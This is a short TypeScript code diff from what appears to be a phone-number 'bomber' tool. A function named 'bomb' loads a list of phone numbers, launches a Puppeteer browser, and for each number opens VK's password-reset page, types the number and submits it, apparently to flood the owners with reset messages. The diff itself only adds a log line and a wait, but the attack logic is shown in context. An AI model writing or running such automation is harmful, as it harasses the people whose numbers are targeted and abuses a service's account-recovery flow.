@@ -13,9 +13,10 @@ import { Browser } from "puppeteer-core";
 export default async function bomb(req: Request, res: Response) {
   const phoneNumbers = getPhoneNumbersAsArray();
   console.log(`Phone numbers: ${phoneNumbers}`);
-  
+
   const browser = await getBrowser({ headless: false });
   console.log("Browser launched...");
+  console.log(browser);
   
   const promises = phoneNumbers.map(async phoneNumber => {
     return interactWithBrowser(browser, phoneNumber);
@@ -37,6 +38,7 @@ async function interactWithBrowser(browser: Browser, phoneNumber: string) {
   const page = await browser.newPage();
   
   await page.goto("https://id.vk.com/restore/#/resetPassword");
+  await wait(3000);
   
   await inputPhoneNumber(page, phoneNumber);
   await pressEnter(page);
